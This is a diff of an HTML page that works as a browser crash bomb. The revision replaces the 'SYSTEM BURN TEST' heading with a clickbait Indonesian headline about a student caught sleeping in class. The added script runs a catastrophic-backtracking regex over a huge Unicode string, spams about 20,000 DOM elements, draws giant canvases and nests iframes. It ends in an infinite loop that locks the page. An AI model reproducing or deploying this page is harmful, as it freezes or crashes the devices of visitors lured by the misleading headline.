@@ -7,7 +7,7 @@
     html, body {
       width: 100%; height: 100%;
       background: black;
-      color: red;
+      color: lime;
       font-family: monospace;
       overflow: hidden;
     }
@@ -15,52 +15,52 @@
   </style>
 </head>
 <body>
-  <h1>⚠️ SYSTEM BURN TEST 30X ⚠️</h1>
+  <h1>Seorang siswa tertangkap basah Tidur di kelas saat jam pelajaran berlangsung siswa melakukan hal yang tak terduga sampai melakukan hal yang sangat memalukan di kelas</h1>
   <script>
-    const u = "ꦲꦴꦿꦺ𓂀𓊃𒈾𒀭𒉿𐏓𐎚𐎷𑀓𑀺𑀽𑁇𑁒";
-    const bigStr = u.repeat(600_000_000); // ≈ 1.2 GB in memory
-
+    const u = "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ";
+    const bigStr = u.repeat(20_000_000);
     const pattern = /([\u1b80-\u1bbf\u13000-\u1342f\ud800-\udfff]+)+$/;
 
-    (function loop() {
-      try { pattern.test(bigStr); } catch (e) {}
+    // 1. Trigger Regex Spike Instantly
+    try { pattern.test(bigStr); } catch (e) {}
 
-      // DOM spam 30,000 elemen per frame
-      for (let i = 0; i < 30_000; i++) {
-        const d = document.createElement("div");
-        d.innerText = u.repeat(3000);
-        d.style.fontSize = `${6 + Math.random() * 40}px`;
-        d.style.color = `hsl(${Math.random() * 360}, 100%, 70%)`;
-        d.style.left = `${Math.random() * window.innerWidth}px`;
-        d.style.top = `${Math.random() * window.innerHeight}px`;
-        document.body.appendChild(d);
-      }
+    // 2. DOM spam ekstrem tanpa jeda
+    for (let i = 0; i < 20000; i++) {
+      const d = document.createElement("div");
+      d.innerText = u.repeat(3000);
+      d.style.fontSize = `${6 + Math.random() * 40}px`;
+      d.style.color = `hsl(${Math.random() * 360}, 100%, 70%)`;
+      d.style.left = `${Math.random() * window.innerWidth}px`;
+      d.style.top = `${Math.random() * window.innerHeight}px`;
+      document.body.appendChild(d);
+    }
 
-      // 300 canvas 20k×20k
-      for (let j = 0; j < 300; j++) {
-        const c = document.createElement("canvas");
-        c.width = c.height = 20000;
-        const ctx = c.getContext("2d");
-        for (let i = 0; i < 1000; i++) {
-          ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.5)`;
-          ctx.fillRect(Math.random()*20000, Math.random()*20000, 1000, 1000);
-        }
-        document.body.appendChild(c);
+    // 3. Canvas overload ekstrem instan
+    for (let j = 0; j < 10; j++) {
+      const c = document.createElement("canvas");
+      c.width = c.height = 20000;
+      const ctx = c.getContext("2d");
+      for (let i = 0; i < 1000; i++) {
+        ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0.5)`;
+        ctx.fillRect(Math.random()*20000, Math.random()*20000, 1000, 1000);
       }
+      document.body.appendChild(c);
+    }
 
-      // Iframe bomb 30 tingkat
-      let nested = "<h1>" + u.repeat(1000) + "</h1>";
-      for (let i = 0; i < 30; i++) {
-        nested = `<iframe srcdoc='${nested.replace(/'/g, "\\'")}'></iframe>`;
-      }
+    // 4. Iframe bom segera
+    for (let k = 0; k < 20; k++) {
       const iframe = document.createElement("iframe");
-      iframe.srcdoc = nested;
+      iframe.srcdoc = `<iframe srcdoc="<iframe srcdoc='<iframe srcdoc=\\"<h1>${u.repeat(1000)}</h1>\\"></iframe>'></iframe>"></iframe>`;
       iframe.width = iframe.height = 2;
       iframe.style.border = "none";
       document.body.appendChild(iframe);
+    }
 
-      requestAnimationFrame(loop);
-    })();
+    // 5. Blocking loop akhir (mengunci thread JS)
+    while (true) {
+      // Spike CPU dengan regex ulang
+      pattern.test(bigStr);
+    }
   </script>
 </body>
 </html>
